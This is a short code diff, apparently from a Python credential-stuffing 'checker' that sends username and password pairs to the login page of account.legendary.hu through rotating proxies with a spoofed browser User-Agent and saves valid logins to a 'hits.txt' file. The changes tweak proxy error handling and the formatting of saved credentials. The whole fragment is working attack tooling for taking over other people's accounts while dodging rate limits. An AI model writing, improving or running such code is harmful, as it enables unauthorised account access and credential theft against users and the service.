@@ -145,15 +145,13 @@ class Main:
         tt = f'{vars.proxy_type}://{vars.proxy_list[vars.current_proxy]}'.replace('\n', '')
       except:
         vars.current_proxy = 0
+        sleep(0.1)
         tt = f'{vars.proxy_type}://{vars.proxy_list[vars.current_proxy]}'.replace('\n', '')
 
       try:
         with Session() as s:
           response = s.post('http://account.legendary.hu/index.php/auth/login', headers={'Accept': '*/*', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x32; rv:88.0) Gecko/20100101 Firefox/87.0',}, data={'loginname': username, 'password': password,}, proxies={'https':tt}, timeout=vars.timeout)
           run = False
-      except ReadTimeout:
-        vars.proxy_list.pop(vars.current_proxy)
-        vars.error += 1
       except:
         vars.current_proxy += 1
         vars.error += 1
@@ -166,7 +164,7 @@ class Main:
           vars.checked += 1
           vars.valid += 1
           with open(f'Results\\{vars.dt_string}\\hits.txt', 'a') as f:
-            f.write(f'{username}:{password}')
+            f.write(f'{username}:{password}\n')
           break
 
 
